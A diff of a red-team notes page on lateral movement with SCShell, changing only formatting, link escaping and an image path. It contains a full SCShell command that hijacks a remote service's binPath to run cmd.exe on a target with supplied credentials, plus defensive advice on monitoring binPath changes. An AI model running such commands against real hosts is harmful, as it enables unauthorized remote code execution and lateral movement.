@@ -8,7 +8,7 @@ Scshell expects the following arguments: target, service, payload, username, dom
 
 {% tabs %}
 {% tab title="attacker@target" %}
-```text
+```
 .\scshell.exe ws01 XblAuthManager "C:\windows\system32\cmd.exe /c echo 'lateral hello' > c:\temp\lat.txt" spotless offense 123456
 ```
 {% endtab %}
@@ -18,11 +18,10 @@ Scshell expects the following arguments: target, service, payload, username, dom
 
 ## Considerations
 
-From the defensive side, you may want to consider about monitoring services that change their binPaths "too often" as this may not be normal in your environment, especially if the binPath is "very" different \([Levenshtein](https://www.google.com/search?q=levenshtein+distance&oq=levensht&aqs=chrome.1.69i57j0l5.2647j0j7&sourceid=chrome&ie=UTF-8)\) to the previously known good value and if the service configuration is being changed over the network:
+From the defensive side, you may want to consider about monitoring services that change their binPaths "too often" as this may not be normal in your environment, especially if the binPath is "very" different ([Levenshtein](https://www.google.com/search?q=levenshtein+distance\&oq=levensht\&aqs=chrome.1.69i57j0l5.2647j0j7\&sourceid=chrome\&ie=UTF-8)) to the previously known good value and if the service configuration is being changed over the network:
 
-![](../../.gitbook/assets/image%20%28475%29.png)
+![](<../../.gitbook/assets/image (245).png>)
 
 ## References
 
 {% embed url="https://github.com/Mr-Un1k0d3r/SCShell" %}
-
